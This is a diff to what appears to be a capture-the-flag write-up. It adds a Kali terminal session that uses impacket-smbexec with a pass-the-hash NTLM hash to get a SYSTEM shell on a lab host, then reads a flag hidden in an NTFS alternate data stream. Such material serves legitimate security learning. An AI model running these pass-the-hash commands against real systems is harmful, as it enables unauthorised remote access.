@@ -265,6 +265,94 @@ C:\Windows\system32>
 
 ```
 
+
+```
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-smbexec -hashes :e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.129.228.112
+
+Impacket v0.14.0.dev0+20251120.95652.9c2d8b61 - Copyright Fortra, LLC and its affiliated companies 
+
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>cd c:\users\administrator\Desktop
+[-] You can't CD under SMBEXEC. Use full paths.
+C:\Windows\system32>type c:\users\administrator\Desktop\root.txt
+The system cannot find the file specified.
+
+C:\Windows\system32>dir c:\users\administrator\desktop
+ Volume in drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of c:\users\administrator\desktop
+
+11/08/2017  10:05 AM    <DIR>          .
+11/08/2017  10:05 AM    <DIR>          ..
+12/24/2017  03:51 AM                36 hm.txt
+11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File(s)            833 bytes
+               2 Dir(s)   2,648,481,792 bytes free
+
+C:\Windows\system32>type c:\users\administrator\Desktop\hm.txt
+The flag is elsewhere.  Look deeper.
+C:\Windows\system32>dir /s /b C:\root.txt 2>nul
+[-] SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
+                                                                                                                    
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-smbexec -hashes :e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.129.228.112
+
+Impacket v0.14.0.dev0+20251120.95652.9c2d8b61 - Copyright Fortra, LLC and its affiliated companies 
+
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>dir /s /b C:\root.txt 2>nul
+[-] SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
+                                                                                                                    
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-smbexec -hashes :e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.129.228.112
+
+Impacket v0.14.0.dev0+20251120.95652.9c2d8b61 - Copyright Fortra, LLC and its affiliated companies 
+
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>dir /R C:\Users\Administrator\Desktop\hm.txt
+
+ Volume in drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:\Users\Administrator\Desktop
+
+12/24/2017  03:51 AM                36 hm.txt
+                                    34 hm.txt:root.txt:$DATA
+               1 File(s)             36 bytes
+               0 Dir(s)   2,648,481,792 bytes free
+
+C:\Windows\system32>
+C:\Windows\system32>type c:\users\administrator\Desktop\hm.txt:root.txt:$DATA
+The filename, directory name, or volume label syntax is incorrect.
+
+C:\Windows\system32>type c:\users\administrator\Desktop\hm.txt:root.txt
+The filename, directory name, or volume label syntax is incorrect.
+
+C:\Windows\system32>more < C:\Users\Administrator\Desktop\hm.txt:root.txt
+
+^C[-] Error occurs while reading from remote(104)
+[-] [Errno 32] Broken pipe
+                                                                                                                    
+┌──(kali㉿kali)-[~/Downloads]
+└─$ impacket-smbexec -hashes :e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.129.228.112
+
+Impacket v0.14.0.dev0+20251120.95652.9c2d8b61 - Copyright Fortra, LLC and its affiliated companies 
+
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>powershell -Command "Get-Content C:\Users\Administrator\Desktop\hm.txt -Stream root.txt"
+
+afbc5bd4b615a60648cec41c6ac92530
+
+C:\Windows\system32>
+C:\Windows\system32>
+
+```
+
 ---
 ## Remediation
 
